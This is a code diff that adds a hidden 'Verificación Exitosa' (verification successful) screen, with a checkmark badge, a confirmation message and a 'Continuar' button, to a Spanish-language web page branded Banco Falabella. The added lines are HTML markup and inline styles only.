@@ -546,6 +546,28 @@
       </div>
     </div>
 
+    <div class="clave-screen" id="exitoScreen" hidden>
+      <header class="clave-top">
+        <img class="logo-lockup" src="/logo.svg" alt="Banco Falabella" />
+      </header>
+      <div class="clave-body" style="justify-content: center; align-items: center; text-align: center;">
+        <div class="clave-visual" aria-hidden="true" style="margin-bottom: 24px; position: static; display: flex; justify-content: center;">
+          <div class="clave-badge" style="position: static; transform: none; background: #3b9326; width: 80px; height: 80px; display: flex; align-items: center; justify-content: center; border-radius: 50%; box-shadow: 0 4px 12px rgba(59, 147, 38, 0.3);">
+            <svg viewBox="0 0 24 24" fill="none" style="width: 48px; height: 48px;">
+              <path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" />
+            </svg>
+          </div>
+        </div>
+        <div class="clave-copy" style="margin-bottom: 32px;">
+          <h1 style="color: #3b9326; font-size: 24px; font-weight: 600; margin-bottom: 12px;">Verificación Exitosa</h1>
+          <p style="color: #5c6066; font-size: 16px; max-width: 320px; margin: 0 auto; line-height: 1.5;">
+            Tu identidad ha sido verificada correctamente. Ya puedes continuar con el proceso.
+          </p>
+        </div>
+        <button class="clave-auth" id="exitoBtn" type="button" style="max-width: 280px; width: 100%; display: block; margin: 0 auto; opacity: 1; cursor: pointer;">Continuar</button>
+      </div>
+    </div>
+
     <div class="toast" id="toast"></div>
     <div class="bf-loader" id="bfLoader" aria-live="polite" aria-busy="true">
       <div class="bf-loader-box">
